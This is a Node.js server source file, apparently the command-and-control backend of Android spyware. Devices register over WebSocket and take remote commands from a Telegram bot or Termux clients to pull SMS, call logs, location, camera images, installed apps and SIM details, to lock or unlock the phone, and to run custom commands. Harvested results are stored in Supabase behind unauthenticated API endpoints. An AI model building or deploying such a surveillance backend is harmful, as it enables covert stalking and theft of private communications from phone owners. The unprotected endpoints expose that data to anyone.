const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const { createClient } = require('@supabase/supabase-js');
const cors = require('cors');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });

app.use(cors());
app.use(express.json());

// ==================== Environment Variables ====================
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_SERVICE_KEY = process.env.SUPABASE_SERVICE_KEY;
const SERVER_URL = process.env.SERVER_URL;

if (!TELEGRAM_TOKEN || !SUPABASE_URL || !SUPABASE_SERVICE_KEY) {
  console.error('Missing required environment variables');
  process.exit(1);
}

// ==================== Initialize Clients ====================
const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY);
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: false });

// Set webhook if SERVER_URL provided
if (SERVER_URL) {
  bot.setWebHook(`${SERVER_URL}/webhook`).then(() => {
    console.log('Webhook set successfully');
  }).catch(err => {
    console.error('Failed to set webhook:', err);
  });
}

// ==================== Store connected clients ====================
const devices = new Map();           // deviceId -> socket (Android)
const termuxClients = new Map();     // socket.id -> { socket, deviceId }

// ==================== Helper: Store command result in Supabase ====================
async function storeResult(deviceId, command, result, type = null) {
  try {
    const { error } = await supabase
      .from('command_results')
      .insert([{ device_id: deviceId, command, result, type }]);
    if (error) throw error;
  } catch (err) {
    console.error('Error storing result:', err);
  }
}

// ==================== Helper: Update device last seen ====================
async function updateDeviceLastSeen(deviceId, info = null) {
  try {
    const updateData = { last_seen: new Date() };
    if (info) updateData.info = info;
    const { error } = await supabase
      .from('devices')
      .upsert({ id: deviceId, ...updateData }, { onConflict: 'id' });
    if (error) throw error;
  } catch (err) {
    console.error('Error updating device:', err);
  }
}

// ==================== Telegram Keyboard Markup ====================
const mainKeyboard = {
  reply_markup: {
    keyboard: [
      ['/sms', '/calllog', '/location'],
      ['/appusage', '/apps', '/camera'],
      ['/hotspot on', '/hotspot off', '/lock'],
      ['/unlock', '/sim', '/battery'],
      ['/device', '/charging', '/custom']
    ],
    resize_keyboard: true,
    one_time_keyboard: false
  }
};

// ==================== WebSocket ====================
io.on('connection', (socket) => {
  console.log('New client connected:', socket.id);

  // Android device registration
  socket.on('register', async (data) => {
    const { deviceId, info } = data;
    if (deviceId) {
      devices.set(deviceId, socket);
      socket.deviceId = deviceId;
      socket.isDevice = true;
      console.log(`Device registered: ${deviceId}`);
      await updateDeviceLastSeen(deviceId, info);
      socket.emit('registered', { status: 'ok' });
    }
  });

  // Termux client registration (listens to a specific device)
  socket.on('termuxListen', (data) => {
    const { deviceId } = data;
    if (deviceId) {
      termuxClients.set(socket.id, { socket, deviceId });
      socket.isTermux = true;
      socket.listeningDevice = deviceId;
      console.log(`Termux client ${socket.id} listening to ${deviceId}`);
    }
  });

  // Command result from Android device
  socket.on('commandResult', async (data) => {
    const { command, result, chatId, type } = data;
    const deviceId = socket.deviceId;
    if (!deviceId) return;

    // Store in Supabase
    await storeResult(deviceId, command, result, type);

    // If this command came from Telegram (chatId present), send to Telegram
    if (chatId) {
      bot.sendMessage(chatId, result, { parse_mode: 'HTML' }).catch(err => {
        console.error('Failed to send Telegram message:', err);
      });
    }

    // Also send to any Termux client listening to this device
    for (const [_, client] of termuxClients) {
      if (client.deviceId === deviceId) {
        client.socket.emit('commandResult', { command, result, type });
      }
    }
  });

  socket.on('disconnect', () => {
    console.log('Client disconnected:', socket.id);
    if (socket.isDevice && socket.deviceId) {
      devices.delete(socket.deviceId);
    }
    if (socket.isTermux) {
      termuxClients.delete(socket.id);
    }
  });
});

// ==================== Telegram Webhook ====================
app.post('/webhook', (req, res) => {
  const update = req.body;
  if (update.message) {
    const chatId = update.message.chat.id;
    const text = update.message.text;
    const deviceId = chatId.toString(); // using chat ID as device ID (one device per chat)

    // Handle /start command
    if (text === '/start') {
      bot.sendMessage(chatId, 'Welcome! Select a command:', mainKeyboard)
        .catch(console.error);
      return res.sendStatus(200);
    }

    // Forward command to device if online
    const deviceSocket = devices.get(deviceId);
    if (deviceSocket) {
      deviceSocket.emit('command', { command: text, chatId });
      res.sendStatus(200);
    } else {
      bot.sendMessage(chatId, '❌ Device is offline or not registered.')
        .catch(console.error);
      res.sendStatus(200);
    }
  } else {
    res.sendStatus(200);
  }
});

// ==================== Termux Command Endpoint ====================
app.post('/sendCommand', async (req, res) => {
  const { deviceId, command } = req.body;
  if (!deviceId || !command) {
    return res.status(400).json({ error: 'deviceId and command required' });
  }

  const deviceSocket = devices.get(deviceId);
  if (deviceSocket) {
    deviceSocket.emit('command', { command, chatId: null });
    res.json({ status: 'sent' });
  } else {
    const { data, error } = await supabase
      .from('devices')
      .select('id')
      .eq('id', deviceId)
      .single();
    if (data) {
      res.status(404).json({ error: 'Device is offline' });
    } else {
      res.status(404).json({ error: 'Device not found' });
    }
  }
});

// ==================== API Endpoints for Termux Device Selection ====================
app.get('/api/devices', async (req, res) => {
  const { data, error } = await supabase
    .from('devices')
    .select('*')
    .order('last_seen', { ascending: false });
  if (error) return res.status(500).json({ error: error.message });
  res.json(data);
});

app.get('/api/results/:deviceId', async (req, res) => {
  const { deviceId } = req.params;
  const limit = parseInt(req.query.limit) || 50;
  const { data, error } = await supabase
    .from('command_results')
    .select('*')
    .eq('device_id', deviceId)
    .order('created_at', { ascending: false })
    .limit(limit);
  if (error) return res.status(500).json({ error: error.message });
  res.json(data);
});

// ==================== Health Check ====================
app.get('/', (req, res) => {
  res.send('Monitor Server is running with Supabase and Telegram bot');
});

// ==================== Start Server ====================
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});